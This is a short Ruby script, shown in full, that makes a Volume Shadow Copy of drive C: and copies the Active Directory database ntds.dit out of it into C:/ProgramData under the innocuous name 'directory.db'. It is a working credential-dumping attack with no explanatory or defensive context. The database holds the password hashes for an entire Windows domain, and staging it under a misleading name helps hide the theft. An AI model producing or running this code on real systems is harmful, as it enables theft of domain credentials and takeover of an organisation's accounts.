require 'fileutils'
system('vssadmin.exe create shadow /for=C:') or abort('snapshot failed')
FileUtils.cp('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy23\\Windows\\NTDS\\ntds.dit', 'C:/ProgramData/directory.db')
